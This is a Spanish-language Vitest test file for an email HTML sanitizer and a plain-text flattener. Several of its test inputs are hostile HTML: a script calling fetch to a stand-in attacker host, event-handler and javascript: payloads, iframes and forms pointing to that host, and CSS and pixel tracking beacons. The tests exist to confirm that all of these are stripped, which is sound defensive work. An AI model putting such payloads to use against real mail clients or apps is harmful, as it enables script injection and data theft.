import { describe, expect, it } from "vitest";
import { sanearCorreo, textoPlano } from "./sanitizar";

// Esto protege la sesión del equipo de correos hostiles. Si una de estas cae, no es un bug
// cosmético: es un agujero por el que un correo cualquiera ejecuta o espía dentro de la app.

describe("sanearCorreo — lo que tiene que morir", () => {
  it("mata <script> entero, con su contenido", () => {
    const r = sanearCorreo(`<p>hola</p><script>fetch("https://mal.example/roba")</script>`);
    expect(r.html).not.toContain("script");
    expect(r.html).not.toContain("mal.example");
    expect(r.html).toContain("hola");
  });

  it("mata los manejadores de eventos", () => {
    const r = sanearCorreo(`<img src="https://x.example/a.png" onerror="alert(1)"><div onclick="x()">clic</div>`);
    expect(r.html).not.toContain("onerror");
    expect(r.html).not.toContain("onclick");
  });

  it("mata javascript: en los enlaces", () => {
    const r = sanearCorreo(`<a href="javascript:alert(1)">premio</a>`);
    expect(r.html).not.toContain("javascript:");
  });

  it("mata iframes, formularios y objetos", () => {
    const r = sanearCorreo(`<iframe src="https://mal.example"></iframe><form action="https://mal.example"><input></form><object data="x"></object>`);
    for (const tag of ["iframe", "form", "input", "object"]) expect(r.html).not.toContain(`<${tag}`);
  });

  it("mata position/z-index (nadie se sale del marco) y url() en estilos (baliza por CSS)", () => {
    const r = sanearCorreo(`<div style="position:fixed;top:0;z-index:9999;background-image:url(https://mal.example/px)">tapa</div>`);
    expect(r.html).not.toContain("position");
    expect(r.html).not.toContain("mal.example");
    expect(r.html).toContain("tapa");
  });
});

describe("sanearCorreo — imágenes", () => {
  it("bloquea las remotas por defecto Y las cuenta (son balizas de apertura)", () => {
    const r = sanearCorreo(`<p>oferta</p><img src="https://tracker.example/pixel.gif"><img src="https://cdn.example/foto.jpg">`);
    expect(r.imagenesBloqueadas).toBe(2);
    expect(r.html).not.toContain("tracker.example");
  });

  it("con permiso, las remotas viven — pero un onerror en la misma etiqueta sigue muerto", () => {
    const r = sanearCorreo(`<img src="https://cdn.example/foto.jpg" onerror="x()">`, { permitirImagenes: true });
    expect(r.imagenesBloqueadas).toBe(0);
    expect(r.html).toContain("cdn.example/foto.jpg");
    expect(r.html).not.toContain("onerror");
  });

  it("las cid: (incrustadas) mueren incluso con permiso: esta versión no las resuelve", () => {
    const r = sanearCorreo(`<img src="cid:logo123">`, { permitirImagenes: true });
    expect(r.html).not.toContain("cid:");
    expect(r.imagenesBloqueadas).toBe(1);
  });
});

describe("sanearCorreo — lo que tiene que vivir", () => {
  it("un boletín de tablas con estilos en línea se conserva legible", () => {
    const r = sanearCorreo(
      `<table width="600" align="center"><tr><td style="background-color:#f4f4f4;padding:16px;text-align:center"><h1 style="color:#333;font-size:24px">Hola</h1><p style="line-height:1.5">Texto del boletín</p></td></tr></table>`,
    );
    expect(r.html).toContain("<table");
    expect(r.html).toContain("background-color");
    expect(r.html).toContain("Texto del boletín");
  });

  it("los enlaces salen con target _blank y noopener, sin que el remitente lo decida", () => {
    const r = sanearCorreo(`<a href="https://cliente.example/brief">el brief</a>`);
    expect(r.html).toContain(`target="_blank"`);
    expect(r.html).toContain("noopener");
    expect(r.html).toContain("cliente.example/brief");
  });

  it("mailto: sobrevive — «escríbenos a» es legítimo en un correo", () => {
    const r = sanearCorreo(`<a href="mailto:hola@labstream.co">escríbenos</a>`);
    expect(r.html).toContain("mailto:hola@labstream.co");
  });
});

describe("textoPlano", () => {
  it("aplana HTML a una línea y recorta con elipsis", () => {
    const t = textoPlano(`<p>Hola&nbsp;equipo,</p><p>les   comparto <b>la propuesta</b></p>`, 30);
    expect(t).toBe("Hola equipo, les comparto la …");
  });

  it("de un script no queda ni el texto", () => {
    expect(textoPlano(`<script>secreto()</script>hola`)).toBe("hola");
  });
});
